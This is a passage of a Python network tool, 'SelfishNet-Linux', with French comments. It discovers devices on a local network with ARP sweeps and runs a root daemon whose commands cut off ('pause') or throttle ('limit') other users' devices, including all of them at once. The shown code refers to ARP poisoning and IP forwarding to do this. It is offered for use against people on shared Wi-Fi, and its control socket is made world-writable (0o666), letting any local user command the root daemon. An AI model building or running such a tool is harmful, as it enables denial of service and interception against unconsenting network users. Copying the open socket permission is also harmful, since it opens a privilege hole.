            with open(self.safe_file) as f:
                return set(json.load(f))
        except Exception:
            return set()

    def _save_safe(self):
        try:
            os.makedirs(STATE_DIR, exist_ok=True)
            with open(self.safe_file + ".tmp", "w") as f:
                json.dump(list(self.safe_targets), f, indent=2)
            os.replace(self.safe_file + ".tmp", self.safe_file)
        except Exception as exc:
            self.enf.errors.append(f"Sauvegarde safe mode : {exc}")

    def is_safe(self, ip, mac=None):
        if ip in (self.my_ip, self.gw_ip):
            return True
        if mac and mac in (self.my_mac, self.gw_mac):
            return True
        if ip and str(ip).strip().lower() in self.safe_targets:
            return True
        if mac and str(mac).strip().lower() in self.safe_targets:
            return True
        return False

    # -- résolution des cibles façon "1,3,4" / "all" / "192.168.1.23"
    def resolve_targets(self, token):
        if not token:
            return []
        token = str(token).strip()
        rows = self.disc.snapshot()
        valid = re.compile(r"([0-9a-f]{2}:){5}[0-9a-f]{2}")

        def pair(r):
            mac = r.get("mac")
            if not valid.fullmatch(mac or ""):
                mac = (self.disc.devices.get(r["ip"]) or {}).get("mac") or arp_lookup(r["ip"])
            return (r["ip"], mac)

        if token.lower() in ("all", "*"):
            return [pair(r) for r in rows if not self.is_safe(r["ip"], r.get("mac"))]
        if token.lower() in ("local", "autres", "ext"):
            return [pair(r) for r in rows if not self.is_safe(r["ip"], r.get("mac"))]
        out = []
        for part in re.split(r"[,\s]+", token):
            if not part:
                continue
            if re.fullmatch(r"\d+", part):
                i = int(part)
                if 1 <= i <= len(rows):
                    ip = rows[i - 1]["ip"]
                    mac = rows[i - 1].get("mac")
                    if not valid.fullmatch(mac or ""):
                        mac = (self.disc.devices.get(ip) or {}).get("mac") or arp_lookup(ip)
                    out.append((ip, mac))
            elif re.fullmatch(r"(\d+\.\d+\.\d+\.\d+)(/\d+)?", part):
                ip = part.split("/")[0]
                mac = (self.disc.devices.get(ip) or {}).get("mac") or arp_lookup(ip)
                if not valid.fullmatch(mac or ""):
                    mac = self.enf.resolve(ip, fast=True)
                out.append((ip, mac))
            elif re.fullmatch(r"([0-9a-f]{2}:){5}[0-9a-f]{2}", part.lower()):
                for r in rows:
                    if r["mac"] == part.lower():
                        out.append((r["ip"], r["mac"]))
        return out

    def apply(self, targets, mode, rate=None):
        valid_pairs = []
        applied = []
        for ip, mac in targets:
            if not mac:
                mac = (self.disc.devices.get(ip) or {}).get("mac")
            if not mac and mode in ("pause", "limit"):
                continue
            if self.is_safe(ip, mac) and mode in ("pause", "limit"):
                continue
            valid_pairs.append((ip, mac))
            applied.append(ip)

        if valid_pairs:
            self.enf.set_targets_batch(valid_pairs, mode, rate)

        if mode == "free":
            self.message = f"libérés : {len(applied)} appareil(s)"
        elif not applied:
            self.message = ("aucune cible valide ou cibles protégées par Safe Mode")
        else:
            self.message = f"{mode} sur {len(applied)} appareil(s)"
        return applied

    def _active_probe(self):
        try:
            from scapy.all import Ether, ARP, srp
            net = ipaddress.IPv4Network(f"{self.my_ip}/{self.mask}", strict=False)
            subnet = str(net)
            pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet)
            ans, _ = srp(pkt, iface=self.iface, timeout=1.8, retry=1, verbose=0)
            now = time.time()
            found = 0
            for _, rcv in ans:
                if rcv.haslayer(ARP):
                    ip = rcv[ARP].psrc
                    mac = (rcv[ARP].hwsrc or "").lower()
                    if ip and ip != "0.0.0.0" and ip != self.my_ip:
                        with self.disc.lock:
                            d = self.disc.devices.get(ip)
                            if not d:
                                self.disc.devices[ip] = {
                                    "mac": mac, "first": now, "last": now,
                                    "pkts": 1, "bytes": 64
                                }
                            else:
                                d["last"] = now
                                if mac and mac != "00:00:00:00:00:00":
                                    d["mac"] = mac
                        found += 1
            self.message = f"Rafraîchissement terminé : {found} appareil(s) actif(s)"
        except Exception as exc:
            self.enf.errors.append(f"Erreur balayage ARP : {exc}")

    # -- serveur IPC
    def serve(self):
        try:
            os.unlink(SOCK_FILE)
        except OSError:
            pass
        srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        srv.bind(SOCK_FILE)
        # Permettre à l'interface graphique lancée par l'utilisateur d'interagir avec le démon
        os.chmod(SOCK_FILE, 0o666)
        srv.listen(16)
        srv.settimeout(1.0)
        while self.running:
            try:
                conn, _ = srv.accept()
            except socket.timeout:
                continue
            threading.Thread(target=self._dispatch_client, args=(conn,), daemon=True).start()
        srv.close()
        try:
            os.unlink(SOCK_FILE)
        except OSError:
            pass

    def _dispatch_client(self, conn):
        try:
            conn.settimeout(20.0)
            data = conn.recv(65536).decode().strip()
            req = json.loads(data or "{}")
            resp = self.handle(req)
            conn.sendall((json.dumps(resp) + "\n").encode())
        except Exception as exc:
            try:
                conn.sendall((json.dumps({"error": str(exc)}) + "\n").encode())
            except Exception:
                pass
        finally:
            try:
                conn.close()
            except Exception:
                pass

    def handle(self, req):
        cmd = req.get("cmd")
        if cmd == "ping":
            return {"ok": True, "iface": self.iface, "version": VERSION}
        if cmd == "status":
            devs = self.disc.snapshot()
            for d in devs:
                d["is_safe"] = self.is_safe(d["ip"], d.get("mac"))
            return {"ok": True, "iface": self.iface, "my_ip": self.my_ip,
                    "gateway": self.gw_ip, "devices": devs,
                    "targets": self.enf.summary(),
                    "safe": list(self.safe_targets),
                    "total_kbit": self.disc.total_kbit(),
                    "errors": self.enf.errors[-5:]}
        if cmd == "safe_add":
            tg = req.get("target")
            if not tg:
                return {"error": "Cible manquante"}
            tg_clean = str(tg).strip().lower()
            self.safe_targets.add(tg_clean)
            self._save_safe()
            mac = arp_lookup(tg_clean) or self.enf.resolve(tg_clean)
            self.enf.set_target(tg_clean, mac, "free")
            return {"ok": True, "message": f"{tg} est maintenant protégé (Safe Mode)."}
        if cmd == "safe_remove":
            tg = str(req.get("target", "")).strip().lower()
            if tg in (self.my_ip.lower(), (self.gw_ip or "").lower(),
                      (self.my_mac or "").lower(), (self.gw_mac or "").lower()):
                return {"error": "Votre machine et la box sont protégées de façon permanente."}
            self.safe_targets.discard(tg)
            self._save_safe()
            return {"ok": True, "message": f"{tg} retiré du Safe Mode."}
        if cmd == "safe_list":
            return {"ok": True, "safe": list(self.safe_targets), "my_ip": self.my_ip, "gateway": self.gw_ip}
        if cmd in ("rescan", "refresh"):
            threading.Thread(target=self._active_probe, daemon=True).start()
            return {"ok": True, "message": "Balayage actif du réseau en cours…"}
        if cmd == "set":
            tg = req.get("targets", "all")
            pairs = self.resolve_targets(tg)
            mode = req.get("mode", "pause")
            rate = req.get("rate")
            applied = self.apply(pairs, mode, rate)
            return {"ok": True, "applied": applied, "message": self.message}
        if cmd == "free_all":
            self.enf.clear_all()
            return {"ok": True, "message": "tous les appareils libérés"}
        if cmd == "quit":
            self.running = False
            return {"ok": True, "message": "arrêt en cours"}
        return {"error": f"commande inconnue : {cmd}"}

    def run(self, tui=False):
        info(f"Interface {self.iface} — IP {self.my_ip} — passerelle {self.gw_ip} ({self.gw_mac})")
        if not self.gw_mac:
            die("MAC de la passerelle introuvable : êtes-vous bien connecté à la box ?")
        if not ip_forward_enabled():
            warn("ip_forward était désactivé : activation (nécessaire pour le mode limit)")
        self.disc.start()
        self.enf.start()
        threading.Thread(target=self._active_probe, daemon=True).start()
        signal.signal(signal.SIGINT, lambda *_: setattr(self, "running", False))
        signal.signal(signal.SIGTERM, lambda *_: setattr(self, "running", False))
        th = threading.Thread(target=self.serve, daemon=True)
        th.start()
        info("Découverte active du réseau en cours …")
        time.sleep(2)
        info("Prêt. Commandes : sudo python3 selfishnet.py <scan|pause|limit|free|status>")
        if tui:
            self.loop_tui()
        else:
            last_probe = time.time()
            while self.running:
                time.sleep(1)
                if time.time() - last_probe > 60:
                    last_probe = time.time()
                    threading.Thread(target=self._active_probe, daemon=True).start()
        self.shutdown()

    def shutdown(self):
        info("Nettoyage : restauration ARP + suppression des règles…")
        self.enf.stop()
        self.disc.stop()
        good("Réseau rendu à son état normal. À bientôt.")

    # -- interface interactive
    def loop_tui(self):
        import termios
        import tty
        fd = sys.stdin.fileno()
        if not sys.stdin.isatty():
            tui = False
        else:
            old = termios.tcgetattr(fd)
            tty.setcbreak(fd)
        try:
            while self.running:
                self.draw()
                r, _, _ = select.select([sys.stdin], [], [], 2.0)
                if r:
                    ch = sys.stdin.read(1)
                    if not self.key(ch):
                        break
        finally:
            if sys.stdin.isatty():
                termios.tcsetattr(fd, termios.TCSADRAIN, old)
                print()

    def draw(self):
        rows = self.disc.snapshot()
        st = {t["ip"]: t for t in self.enf.summary()}
        os.system("clear" if os.environ.get("TERM") != "dumb" else "true")
        print(f"\033[1mSelfishNet-Linux {VERSION}\033[0m  —  {self.iface} "
              f"({self.my_ip})  —  box {self.gw_ip}  —  trafic total "
              f"{self.disc.total_kbit():.0f} kb/s\n")
        print(render_table(rows[:25], st))
        print(f"\n\033[90m{self.message}\033[0m")
        print("\n\033[1mAide\033[0m  [n°] pause/reprendre un appareil   "
              "l = limiter tout (500k)   p = pause tout   f = tout libérer   "
              "r = rescan   q = quitter")
        if self.enf.errors:
            print(f"\033[33m{self.enf.errors[-1]}\033[0m")

    def key(self, ch):
        if ch in ("q", "Q", "\x03", "\x04"):
            self.running = False
            return False
        if ch == "f":
            self.enf.clear_all()
            self.message = "tous les appareils libérés"
        elif ch == "p":
            self.apply(self.resolve_targets("all"), "pause")
        elif ch == "l":
            self.apply(self.resolve_targets("all"), "limit", self.rate_default)
        elif ch == "r":
            self.message = f"{len(self.disc.snapshot())} appareil(s) sur le réseau"
        elif ch.isdigit():
            idx = ch
            if self.disc.snapshot() and 1 <= int(idx) <= len(self.disc.snapshot()):
                rows = self.disc.snapshot()
                ip, mac = rows[int(idx) - 1]["ip"], rows[int(idx) - 1]["mac"]
                cur = {t["ip"]: t for t in self.enf.summary()}.get(ip)
                if cur and cur["mode"] == "pause":
                    self.apply([(ip, mac)], "free")
                elif cur and cur["mode"] == "limit":
                    self.apply([(ip, mac)], "pause")
                else:
                    self.apply([(ip, mac)], "pause")
        return True


# ------------------------------------------------------------------ CLI
def cmd_scan(args):
    require_root()
    iface = args.iface or default_iface()
    my_ip, mask = iface_ip(iface)
    gw = gateway_ip(iface)
    disc = Discovery(iface, my_ip, gw, mask)
    disc.start()
    dur = args.time
    info(f"Écoute du réseau local {my_ip}/{mask} pendant {dur} s (passerelle {gw})…")
    if args.watch:
        return cmd_watch(args, disc)
    deadline = time.time() + dur
    try:
        while time.time() < deadline:
            time.sleep(0.5)
    except KeyboardInterrupt:
        pass
    rows = disc.snapshot()
    disc.stop()
    print()
    print(render_table(rows, {}))
    print(f"\n{len(rows)} appareil(s) détecté(s).")
    print("\nExemples :")
    print("  sudo python3 selfishnet.py pause 2        # coupe l'appareil n°2")
    print("  sudo python3 selfishnet.py limit 2 --rate 300")
    print("  sudo python3 selfishnet.py free all")
    if rows:
        save_state({"last_scan": [r["ip"] for r in rows], "iface": iface,
                    "my_ip": my_ip, "gateway": gw, "ts": time.time()})
    return 0


def cmd_watch(args, disc=None):
    require_root()
    if disc is None:
        d = Daemon(args.iface, args.rate)
        d.run(tui=True)
        return 0
    # mode "scan --watch" : simple rafraîchissement sans bridage
    try:
        while True:
            os.system("clear")
            rows = disc.snapshot()
            print(f"\033[1mAppareils sur le réseau\033[0m (Ctrl-C pour sortir)\n")
            print(render_table(rows, {}))
            print(f"\ntrafic total : {disc.total_kbit():.0f} kb/s")
            time.sleep(2)
    except KeyboardInterrupt:
        disc.stop()
        return 0


def cmd_safe_add(args):
    st = ipc_send({"cmd": "safe_add", "target": args.target})
    if st.get("error") == "daemon_absent":
        die("Le service n'est pas lancé.")
    if st.get("error"):
        die(st["error"])
    good(st.get("message", "ok"))
    return 0


def cmd_safe_del(args):
    st = ipc_send({"cmd": "safe_remove", "target": args.target})
    if st.get("error") == "daemon_absent":
        die("Le service n'est pas lancé.")
    if st.get("error"):
        die(st["error"])
    good(st.get("message", "ok"))
    return 0


def cmd_safe_list(args):
    st = ipc_send({"cmd": "safe_list"})
    if st.get("error") == "daemon_absent":
        die("Le service n'est pas lancé.")
    if st.get("error"):
        die(st["error"])
    print("\nAppareils protégés (Safe Mode - immunisés contre tout blocage/limite) :")
    print(f"  * {st.get('my_ip')} (Votre PC - protégé d'office)")
    print(f"  * {st.get('gateway')} (Box/Passerelle - protégée d'office)")
    for tg in st.get("safe", []):
        if tg not in (st.get('my_ip'), st.get('gateway')):
            print(f"  * {tg} (protégé par l'utilisateur)")
    print()
    return 0


def _set_mode(mode, args):
    status = ipc_send({"cmd": "set", "targets": args.target, "mode": mode,
                       "rate": getattr(args, "rate", None)})
    if status.get("error") == "daemon_absent":
        die("Le service n'est pas lancé. Ouvrez un terminal avec :\n"
            "   sudo python3 selfishnet.py watch\n"
            "puis relancez cette commande dans un second terminal.")
    if status.get("error"):
        die(f"erreur : {status['error']}")
    good(status.get("message", "ok"))
    return 0


def cmd_status(args):
    st = ipc_send({"cmd": "status"})
    if st.get("error") == "daemon_absent":
        die("service non lancé (sudo python3 selfishnet.py watch)")
    if st.get("error"):
        die(st["error"])
    tstate = {t["ip"]: t for t in st["targets"]}
    print(render_table(st["devices"], tstate))
    print(f"\ntrafic total mesuré : {st['total_kbit']:.0f} kb/s")
    for e in st.get("errors", []):
        warn(e)
    return 0


def cmd_free(args):
    if args.target in ("all", "*", None):
        st = ipc_send({"cmd": "free_all"})
    else:
        st = ipc_send({"cmd": "set", "targets": args.target, "mode": "free"})
    if st.get("error") == "daemon_absent":
        die("service non lancé")
    good(st.get("message", "ok"))
    return 0


def cmd_quit(args):
    st = ipc_send({"cmd": "quit"})
    good(st.get("message", "arrêt"))
    return 0


def cmd_clean(args):
    """Filet de sécurité : enlève toutes les traces laissées par l'outil."""
    require_root()
    iface = args.iface or default_iface()
    ok(f"iptables -D FORWARD -j {IPT_CHAIN}")
    ok(f"iptables -F {IPT_CHAIN}")
    ok(f"iptables -X {IPT_CHAIN}")
    ok(f"iptables -t mangle -D FORWARD -j {MANGLE_CHAIN}")
    ok(f"iptables -t mangle -F {MANGLE_CHAIN}")
    ok(f"iptables -t mangle -X {MANGLE_CHAIN}")
    run(f"tc qdisc del dev {iface} root")
    # restaure les entrées ARP polluées en les vidant (le noyau les réapprend)
    run("ip neigh flush all")
    good("Règles supprimées, tables ARP réinitialisées, ip_forward inchangé.")
    return 0


def build_parser():
    p = argparse.ArgumentParser(
        prog="selfishnet.py",
        description="SelfishNet pour Linux : reprendre le contrôle du wifi partagé "
                    "(pause / limit / free des autres appareils).",
        epilog="Exemples :\n"
               "  sudo python3 selfishnet.py doctor\n"
               "  sudo python3 selfishnet.py scan\n"
               "  sudo python3 selfishnet.py watch          # interface interactive\n"
               "  sudo python3 selfishnet.py pause 2        # n°2 vu par scan\n"
               "  sudo python3 selfishnet.py limit 2 --rate 300\n"
               "  sudo python3 selfishnet.py free all\n"
               "  sudo python3 selfishnet.py quit\n",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--iface", help="interface réseau (défaut : route par défaut)")
    p.add_argument("-V", "--version", action="version", version=f"SelfishNet-Linux {VERSION}")
    sub = p.add_subparsers(dest="cmd")

    s = sub.add_parser("scan", help="découvrir les appareils du réseau")
    s.add_argument("-t", "--time", type=int, default=20, help="durée d'écoute (s)")
    s.add_argument("--watch", action="store_true", help="rafraîchir en continu")
    s.set_defaults(func=cmd_scan)

    s = sub.add_parser("refresh", help="forcer un balayage ARP actif de tous les appareils")
    s.set_defaults(func=lambda a: (good(ipc_send({"cmd": "rescan"}).get("message", "ok")), 0)[1])

    s = sub.add_parser("watch", help="lancer le service + interface interactive")
    s.add_argument("--rate", type=int, default=500, help="débit du preset 'limit' (kbit/s)")
    s.set_defaults(func=lambda a: (Daemon(a.iface, a.rate).run(tui=True), 0)[1])

    s = sub.add_parser("daemon", help="lancer le service en arrière-plan (sans TUI)")
    s.add_argument("--rate", type=int, default=500)
    s.set_defaults(func=lambda a: (Daemon(a.iface, a.rate).run(tui=False), 0)[1])

    s = sub.add_parser("pause", help="couper totalement un/des appareil(s)")
    s.add_argument("target", help="n°, IP, MAC, 'all' (ex. 2  2,4  192.168.1.23  all)")
    s.set_defaults(func=lambda a: _set_mode("pause", a))

    s = sub.add_parser("limit", help="plafonner le débit d'un/des appareil(s)")
    s.add_argument("target")
    s.add_argument("-r", "--rate", type=int, default=500, help="kbit/s (défaut 500)")
    s.set_defaults(func=lambda a: _set_mode("limit", a))

    s = sub.add_parser("free", help="rendre un/des appareil(s) à la normale")
    s.add_argument("target", nargs="?", default="all")
    s.set_defaults(func=cmd_free)

    s_safe = sub.add_parser("safe", help="gérer le Safe Mode (appareils protégés)")
    s_safe_sub = s_safe.add_subparsers(dest="safe_cmd")
    p_add = s_safe_sub.add_parser("add", help="protéger un appareil")
    p_add.add_argument("target", help="IP ou MAC de l'appareil à protéger")
    p_add.set_defaults(func=cmd_safe_add)
    p_del = s_safe_sub.add_parser("del", help="retirer un appareil du Safe Mode")
    p_del.add_argument("target", help="IP ou MAC de l'appareil")
    p_del.set_defaults(func=cmd_safe_del)
    p_list = s_safe_sub.add_parser("list", help="lister les appareils protégés")
    p_list.set_defaults(func=cmd_safe_list)

    s = sub.add_parser("status", help="état courant (appareils + bridages actifs)")
    s.set_defaults(func=cmd_status)

    s = sub.add_parser("quit", help="arrêter le service et tout restaurer")
    s.set_defaults(func=cmd_quit)

    s = sub.add_parser("clean", help="nettoyage d'urgence (règles + ARP)")
    s.set_defaults(func=cmd_clean)

    s = sub.add_parser("doctor", help="vérifier que la machine est prête")
    s.set_defaults(func=doctor)

    s = sub.add_parser("selftest", help="prouver que la pause marche sur un appareil")
    s.add_argument("target", help="IP d'un appareil de test (ex. votre téléphone)")
    s.set_defaults(func=selftest)

    return p


def main(argv=None):
    parser = build_parser()
    args = parser.parse_args(argv)
    if not getattr(args, "cmd", None):
        parser.print_help()
        return 0
    if args.cmd in ("scan", "watch", "daemon", "pause", "limit", "free",
                    "status", "quit", "clean", "doctor", "selftest", "safe", "refresh"):
        pass
    try:
        return args.func(args) or 0
    except KeyboardInterrupt:
        print("\ninterrompu.")
        return 130
    except PermissionError as exc:
        die(f"permission refusée ({exc}) — lancez avec sudo")
    except RuntimeError as exc:
        die(str(exc))


if __name__ == "__main__":
    sys.exit(main())
